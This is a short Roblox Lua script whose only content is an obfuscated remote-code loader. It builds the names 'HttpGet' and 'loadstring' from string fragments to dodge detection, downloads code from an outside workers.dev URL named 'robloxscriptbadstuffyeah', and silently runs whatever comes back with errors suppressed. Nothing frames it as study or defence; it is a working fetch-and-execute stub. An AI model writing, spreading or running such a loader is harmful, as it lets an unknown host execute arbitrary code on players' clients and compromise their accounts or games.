local _url = "https://robloxscriptbadstuffyeah.skidi2931.workers.dev/" 

local _get = game["Ht".."tp".."G".."et"]
local _load = _G["loa".."dstr".."ing"]

local _ok, _res = pcall(function()
    return _get(_url)
end)

if _ok and _res then
    local _func, _err = _load(_res)
    if _func then
        pcall(_func)
    end
end
